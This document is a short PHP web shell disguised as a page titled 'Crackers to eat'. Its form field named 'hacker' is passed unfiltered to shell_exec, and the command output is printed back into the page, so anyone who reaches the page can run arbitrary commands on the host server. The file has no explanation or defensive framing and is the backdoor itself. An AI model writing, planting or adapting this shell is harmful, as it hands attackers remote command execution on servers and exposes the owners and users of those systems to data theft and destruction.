<?php

if (isset($_POST['Submit'])) {

    $shel = shell_exec($_POST['hacker']);
}

echo '

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Crackers</title>
    <style>
        body{
            font-family: Arial;
            background:  #333;
            color: white;
            width: 100%;
        }
    </style>
</head>
<body>

    <div>

        <h2 style="text-align: center">Crackers to eat</h2>

            <form name="hacked-form" action="#" method="post">

                <input style="width: 60%" type="text" name="hacker">
                <input type="submit" name="Submit" value="Submit">
                
             </form>
             
        <pre>'. $shel .'</pre>     

    </div>

</body>
</html>
    
';


